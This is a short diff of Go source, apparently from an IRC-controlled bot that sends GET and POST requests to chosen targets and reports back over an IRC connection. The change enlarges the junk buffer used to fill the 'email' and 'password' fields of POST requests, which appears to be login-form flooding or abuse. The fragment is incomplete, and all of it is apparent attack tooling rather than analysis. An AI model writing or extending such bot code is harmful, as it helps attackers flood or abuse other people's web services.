@@ -41,7 +41,7 @@ func GET(getTarget, set_chan string, reportIRC net.Conn) {
 }
 
 func POST(postTarget, set_chan string, reportIRC net.Conn) {
-	buffer := make([]byte, 25)
+	buffer := make([]byte, 50)
 	reqBody, _ := json.Marshal(map[string]string{
 		"email":    string(buffer),
 		"password": string(buffer),
